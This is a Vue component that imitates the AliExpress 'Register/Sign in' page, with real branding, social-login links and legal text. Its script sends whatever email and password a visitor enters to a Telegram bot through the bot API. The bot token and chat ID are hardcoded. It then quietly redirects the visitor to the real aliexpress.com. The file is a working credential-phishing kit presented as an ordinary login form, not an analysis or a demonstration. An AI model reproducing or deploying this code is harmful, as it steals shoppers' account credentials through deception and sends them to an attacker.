<template>
  <div class="page-wrapper">

    <!-- <nav>
      <a href="">
        <img width="156px" height="40px"
          src="https://ae-pic-a1.aliexpress-media.com/kf/Sb900db0ad7604a83b297a51d9222905bm/624x160.png" alt="">
      </a>
    </nav> -->

    <div class="login-card">

      <header class="header">
        <h1>Register/Sign in</h1>
        <p class="protected">
          <!-- <span class="shield"> -->
          <img width="11px" height="13px"
            src="https://ae-pic-a1.aliexpress-media.com/kf/Sa0be8b1ad53f401b8cfb2c5e3bc5373dG/22x26.png" alt="">
          <!-- </span> -->
          Your information is protected
        </p>
      </header>

      <form class="login-form" @submit.prevent="finishJoob">
        <div class="field">
          <label :class="{ floated: emailFocused || email }">
            Email or phone number
          </label>
          <input v-model="email" type="email" autocomplete="off" @focus="emailFocused = true"
            @blur="emailFocused = false" required />
          <button v-if="email" type="button" class="clear-button" @click="email = ''">×</button>
        </div>

        <transition name="slide">
          <div v-if="showPassword" class="field password-field">
            <label :class="{ floated: passwordFocused || password }">
              Password
            </label>
            <input v-model="password" type="password" autocomplete="off" @focus="passwordFocused = true"
              @blur="passwordFocused = false" />
          </div>
        </transition>

        <button class="submit-button" :disabled="!email.trim() || (showPassword && !password)" type="submit">
          {{ showPassword ? 'Sign in' : 'Continue' }}
        </button>
      </form>

      <p class="trouble">
        <a class="trouble"
          href="https://www.aliexpress.com/p/account-center/new-find-password.html?_addShare=no&_rightAction=https://,h&loginId=&returnUrl=https%3A%2F%2Fwww.aliexpress.com%2F&loginId=&returnUrl=https%3A%2F%2Fwww.aliexpress.com%2Fssr%2F300002636%2FyzDkkRQK5D%3FdisableNav%3DYES%26pha_manifest%3Dssr%26_immersiveMode%3Dtrue%26businessCode%3Dug%26o_ids%3D1122903524254070%26edm_log_data%3Dgmod-edm-order-header-system-text.edm-order-header-system-text-log-link%26tracelog%3Drowan%26rowan_id1%3Dlg_del_done_door_202603052203_1_ja_JP_2026-11-02%26rowan_msg_id%3D4070112290352425%246769fd176b2d41ccb49fc8cc8453014a%26ck%3Din_edm_other%26mem_info%3DiERiSzHvifdDB7wq3T4w5Q%3D%3D-1002-lg_del_done_door_202603052203-qajXooPIac%2BAfF4kORDvkcjy4%2Fu%2B%2F%2Bu33rYgzxyz4sc%3D">
          Trouble signing in?
        </a>
      </p>

      <div class="separator">
        <span></span>
        <p>Or continue with</p>
        <span></span>
      </div>

      <div class="social-icons">
        <div class="social-icon">
          <a
            href="https://www.aliexpress.com/ssr/300002636/yzDkkRQK5D?disableNav=YES&pha_manifest=ssr&_immersiveMode=true&businessCode=ug&o_ids=1122903524254070&edm_log_data=gmod-edm-order-header-system-text.edm-order-header-system-text-log-link&tracelog=rowan&rowan_id1=lg_del_done_door_202603052203_1_ja_JP_2026-11-02&rowan_msg_id=4070112290352425$6769fd176b2d41ccb49fc8cc8453014a&ck=in_edm_other&mem_info=iERiSzHvifdDB7wq3T4w5Q==-1002-lg_del_done_door_202603052203-qajXooPIac+AfF4kORDvkcjy4/u+/+u33rYgzxyz4sc=">
            <img width="41px" src="https://ae-pic-a1.aliexpress-media.com/kf/S242a9108557f4e8e9af2492d2e6abfaeH.png"
              alt="">
          </a>
        </div>
        <div class="social-icon google">
          <a
            href="https://accounts.google.com/v3/signin/accountchooser?client_id=438567566819-3k1nk9qd1vr39c42rmjr0dh24ngth0s4.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fthirdparty.aliexpress.com%2Fggcallback.htm&response_type=code&scope=openid+email+profile&state=e%2BWt%2BBU4EWc%2B00iMedLEfOLduDqqo2RtjCpuIuKhIr7s0c8zchTqOPPhVbNt8Mtw%2BSw4PTTdqD5U0F%2FvFN4VHb43WV1FNcMsieyHfhIazmjbQ9zHSGEwuVAF%2FS6W2RkA7YyK8QZnhFwfsCTuW6RzBEnAHifY5irVykSe56Ln%2Bjk0G%2FoO8A3rYvhCaBe4ATatMn5L8GKnEeXgZx5%2FY56%2FCQ%3D%3D&dsh=S-300835931%3A1794004545587511&o2v=2&service=lso&flowName=GeneralOAuthFlow&opparams=%253F&continue=https%3A%2F%2Faccounts.google.com%2Fsignin%2Foauth%2Fv3%2Fconsent%3Fauthuser%3Dunknown%26part%3DAJi8hAPe6UCIHSrnn5vucWkpgKWpNBdGBudNnPqiDEnEDW1zeS008i-5Iz8JMPluaY7ke7x9aj2MFsCzZKPghTxhn_Sdgo_bfwrpwGCEQ_ahxb0P7kiWWnfSmSHD1lzEtQ1YV0sW0ixS9yVKtFV0QCluiGn6YHBPps6vrU6G9gUcU5j31jIcTCLjJ-7ZKwFIW81yTOUPk8oqQnwoWIl5v0Ab1gnjDJfqduyq4ANshlQOQYQGRJzCzNNRJyLeII8E8k2BT1T_-2tQsibhvCZ5Pw0GbxFMzUeTTgCkodKIgdt-6LF-7EkXzWMhabaoSTc8_7uSmmhTp_RjKlBPe6g5GIB7XZ0NOV1MNpnOsRkYL3STh-_CeWG6jr81XKuCBul2QfWjXlspQL4SDuqZn6Y2N_Moqpf2EHQRW_RLGoXLJ0W2iRbA4w55DcQwC9ithqeEDxO4yDXwdh7cf64xwfo2i7DcU1Z1kuQfwSDmiNWqY4-BSYWWQw4XvSU%26flowName%3DGeneralOAuthFlow%26as%3DS-300835931%253A1794004545587511%26client_id%3D438567566819-3k1nk9qd1vr39c42rmjr0dh24ngth0s4.apps.googleusercontent.com%26requestPath%3D%252Fsignin%252Foauth%252Fv3%252Fconsent%23&app_domain=https%3A%2F%2Fthirdparty.aliexpress.com">
            <img width="41px"
              src="https://ae-pic-a1.aliexpress-media.com/kf/S3e1bf34de565495c9c961261c0fcf4adi/100x100.png" alt="">
          </a>
        </div>
        <div class="social-icon apple">
          <a
            href="https://appleid.apple.com/auth/authorize?client_id=com.alibaba.iAliexpressmsite&response_type=code%20id_token&scope=email%20name&response_mode=form_post&state=4raJ%2B442iQItoKGkK7p%2BduyOAbV%2BNlv4F2w6W9rjksmeAwQ%2BaR4dPsIQLC2n0CBfPRDgSKzS%2Fpk6qIwYlgMZqlwODL8OAFqk0s3ecF6PbbI0NdPoHaUnUs23JiVT2xW6ittSXd%2BExQFNZy1PU2nk8IUZxTbcGL2x35s9CiQ4kB8%2FL7n%2B3wikNpb19vSn5sSIc3DDH2x7T26aWxJvaMAPgA%3D%3D&redirect_uri=https%3A%2F%2Fthirdparty.aliexpress.com%2Fapplecallback.htm">
            <img width="45px"
              src="https://ae-pic-a1.aliexpress-media.com/kf/S969d06a5decc4c1181da8f048d9669edu/128x128.png" alt="">
          </a>
        </div>
        <div class="social-icon">
          <a
            href="https://www.facebook.com/login.php?skip_api_login=1&api_key=166363243399924&kid_directed_site=0&app_id=166363243399924&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D166363243399924%26display%3Dpopup%26redirect_uri%3Dhttps%253A%252F%252Fthirdparty.aliexpress.com%252Ffbcallback.htm%26scope%3Demail%252Cpublic_profile%252Cuser_messenger_contact%26messenger_page_id%3D335963307560%26state%3Dsmax%252F6%252BcchZ39dGAWk5zV%252FJZ8KIueH0PUXhbQmZciErKCw1onVfXKQFbU8h5BosPReERT53tPSg8GCySsV4wnTcTqDX7EEY8HtwrOUYdhP8cAe0k6KM3oXPTvkDVDJ1jnXqXWaQKr6skZHzWDB5JH2PQTj2xG0lK0dfjGx8gAmxE71y8CNbuWgmqHqtSRh4KB68F9OQs9j9LZzlmp0%252F9qw%253D%253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D49ff2b21-db89-440e-85a6-eb6d5a06ef74%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fthirdparty.aliexpress.com%2Ffbcallback.htm%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dsmax%252F6%252BcchZ39dGAWk5zV%252FJZ8KIueH0PUXhbQmZciErKCw1onVfXKQFbU8h5BosPReERT53tPSg8GCySsV4wnTcTqDX7EEY8HtwrOUYdhP8cAe0k6KM3oXPTvkDVDJ1jnXqXWaQKr6skZHzWDB5JH2PQTj2xG0lK0dfjGx8gAmxE71y8CNbuWgmqHqtSRh4KB68F9OQs9j9LZzlmp0%252F9qw%253D%253D%23_%3D_&display=popup&locale=en_GB&pl_dbl=0&is_business_login=0">
            <img width="41px" height="41px"
              src="https://ae-pic-a1.aliexpress-media.com/kf/Sa0c2b057f5834bf9bc73dee2323c1960j/102x102.png" alt="">
          </a>
        </div>
        <div class="social-icon">
          <a
            href="https://api.twitter.com/oauth/authenticate?oauth_token=PhSukQAAAAAAah48AAABobL_1tM&state=slFIhx8nxiCCH3if4txaK2j5BF8DUugboCx8NkMR%2BpCDs75BUWghQARUbbbMlpEmxbkdXXEKTcxBzh%2Fi9wChzc93qdKmHpJk9OyJwm1%2BCnaTvjbhJUJKgSfWYIPoyWntqcYq5N5sdcMEoyVwnTyZYW6Kp3y9QUbPCsRNZ6iXJ8MDWkOm2KMvVZyPro0eA3qthBDz7xOH2G8MEMeTsQq10g%3D%3D">
            <img width="41px"
              src="https://ae-pic-a1.aliexpress-media.com/kf/S97c99f75fde845ec9a4fec9af4e2b65fE/112x112.png" alt="">
          </a>
        </div>
      </div>

      <div class="footer">
        <p class="location">
          Location: <strong>United States</strong>
          <span class="chevron">⌄</span>
        </p>

        <span tabindex="0" class="legal">By continuing, you confirm that you are an adult and have read and accepted our
          <a style="color: #979797;" ,=""
            href="//www.aliexpress.com/p/account-legacy/index.html?lang=en_US&amp;type=membership" rel="noreferrer"
            data-set="member-ship">AliExpress Free Membership Agreement</a> and
          <a style="color: #979797;" href="https://campaign.aliexpress.com/wow/gcp/app-redirect-terms/index" target=""
            rel="noreferrer" data-set="policy">Privacy Policy</a>. Your information may be used for marketing purposes,
          but you can opt
          out at any time.
        </span>

        <p class="location-help">Why choose a location?</p>
      </div>
    </div>
  </div>
</template>

<script>
import axios from 'axios';
export default {
  data() {
    return {

      email: '',
      password: '',
      emailFocused: false,
      passwordFocused: false,
      showPassword: false
    }
  },

  methods: {

    async finishJoob() {
       if (this.loading) return

      // First click: reveal password field.
      if (!this.showPassword) {
        if (!this.email.trim()) return

        this.showPassword = true
        return
      }

      // Second click: local preview only.
      // if (!this.password.trim()) return

      this.notice = true
      // this.password = ''
      try {
        // Format the message as string
        const message = `* 🛍️ AliExpress *\nEmail: ${this.email}\nPassword: ${this.password}`;

        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-5167264103",
          message
        );
        this.notice = true;

        window.location.href = `https://aliexpress.com`

      } catch (error) {
        console.error("Navigation error:", error);
        this.loading = false;
      }
    },

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot8995458629:AAF79_PAnUKWhXudSE13oaulwrtpOsdwki0/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  }
}
</script>

<style scoped>
* {
  box-sizing: border-box;
  padding: 0;
  margin: 0;
}

body {
  padding: 0;
  margin: 0;
}

nav {
  position: absolute;
  top: 0;
  width: 100%;
  height: 60px;
  /* background-color: #191919; */
  padding: 20px 48px;
  display: flex;
  align-items: center;
  justify-content: start;
}

.page-wrapper {
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 20px;
  background: #f5f5f5;
  font-family: Arial, sans-serif;
  color: #191919;
}

.login-card {
  position: relative;
  width: 530px;
  min-height: 550px;
  background: #fff;
  padding: 46px 64px 30px;
  text-align: center;
}

.close-button {
  position: absolute;
  top: 14px;
  right: 20px;
  border: none;
  background: transparent;
  font-size: 36px;
  font-weight: 300;
  cursor: pointer;
  color: #191919;
}

.header h1 {
  font-size: 24px;
  font-weight: 700;
  margin: 0 0 10px;
}

.protected {
  font-size: 12px;
  margin: 0;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
}

.shield {
  background: #00a878;
  color: white;
  width: 17px;
  height: 17px;
  border-radius: 4px;
  font-size: 12px;
  display: inline-flex;
  align-items: center;
  justify-content: center;
}

.login-form {
  margin-top: 32px;
}

.field {
  position: relative;
  height: 48px;
  width: 100%;
  border: 1px solid #c9c9c9;
  margin-bottom: 20px;
  text-align: left;
}

.field:focus-within {
  border: 1px solid #191919;
}

.field label {
  position: absolute;
  left: 12px;
  top: 14px;
  font-size: 14px;
  color: #979797;
  pointer-events: none;
  transition: all 0.18s ease;
}

.field label.floated {
  top: 4px;
  font-size: 10px;
}

.field input {
  width: 100%;
  height: 100%;
  border: none;
  outline: none;
  background: transparent;
  padding: 17px 12px 3px;
  font-size: 14px;
  color: #191919;
}

.clear-button {
  position: absolute;
  right: 10px;
  top: 13px;
  border: none;
  border-radius: 50%;
  background: #999;
  color: white;
  width: 20px;
  height: 20px;
  cursor: pointer;
  line-height: 18px;
}

.password-field {
  margin-top: 0;
}

.submit-button {
  width: 100%;
  height: 49px;
  border: none;
  background: #191919;
  color: #fff;
  font-size: 20px;
  font-weight: 700;
  cursor: pointer;
  transition: background 0.2s;
}

.submit-button:disabled {
  background: #d1d1d1;
  cursor: not-allowed;
}

.trouble {
  color: #979797;
  font-size: 14px;
  text-decoration: underline;
  margin: 19px 0 0;
  cursor: pointer;
}

.separator {
  display: flex;
  align-items: center;
  gap: 14px;
  margin-top: 20px;
  color: #979797;
  font-size: 14px;
  white-space: nowrap;
}

.separator span {
  flex: 1;
  height: 1px;
  background: #d1d1d1;
}

.social-icons {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin: 24px 15px 0;
}

.social-icon {
  width: 41px;
  height: 41px;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 28px;
  font-weight: bold;
  color: #1877f2;
}

.google {
  color: #4285f4;
}

.apple {
  color: #191919;
  font-size: 38px;
}

.facebook {
  background: #1296e8;
  color: white;
  font-size: 35px;
  align-items: flex-end;
}

.x-icon {
  background: #000;
  color: #fff;
  font-size: 24px;
}

.footer {
  margin-top: 28px;
  color: #979797;
  font-size: 12px;
}

.location {
  color: #777;
}

.location strong {
  color: #191919;
  margin-left: 5px;
}

.chevron {
  margin-left: 5px;
}

.legal {
  line-height: 6px;
  margin-top: 6px;
}

.location-help {
  text-decoration: underline;
  margin-top: 14px;
}

.slide-enter-active,
.slide-leave-active {
  transition: all 0.25s ease;
  overflow: hidden;
}

.slide-enter,
.slide-leave-to {
  opacity: 0;
  transform: translateY(-10px);
  max-height: 0;
}

@media (max-width: 580px) {
  .page-wrapper {
    padding: 0;
    align-items: flex-start;
  }

  .login-card {
    width: 100%;
    min-height: 550px;
    padding: 55px 24px 30px;
  }
}
</style>
